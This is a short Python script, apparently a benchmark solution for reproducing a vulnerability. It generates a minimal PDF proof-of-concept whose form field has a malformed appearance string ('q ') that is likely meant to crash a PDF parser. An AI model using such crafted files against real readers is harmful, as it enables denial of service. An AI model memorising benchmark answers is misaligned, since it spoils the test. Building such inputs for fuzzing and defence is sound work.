class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.4\n"
        obj1 = b"1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n/AcroForm << /Fields [ << /Type /Annot /Subtype /Widget /Rect [100 100 200 120] /FT /Tx /T (Field1) /DA (q ) >> ] >>\n>>\nendobj\n"
        obj2 = b"2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n"
        obj3 = b"3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Resources << /ProcSet [/PDF /Text] >>\n>>\nendobj\n"

        parts = [header, obj1, obj2, obj3]
        offsets = [0]
        current_offset = 0
        for part in parts:
            current_offset += len(part)
            offsets.append(current_offset - len(part))

        body_end = current_offset
        startxref_pos = body_end

        xref_str = f"""xref
0 4
0000000000 65535 f 
{offsets[1]:010d} 00000 n 
{offsets[2]:010d} 00000 n 
{offsets[3]:010d} 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
{startxref_pos}
%%EOF"""
        xref_bytes = xref_str.encode('ascii') + b"\n"

        poc = b"".join(parts) + xref_bytes
        return poc
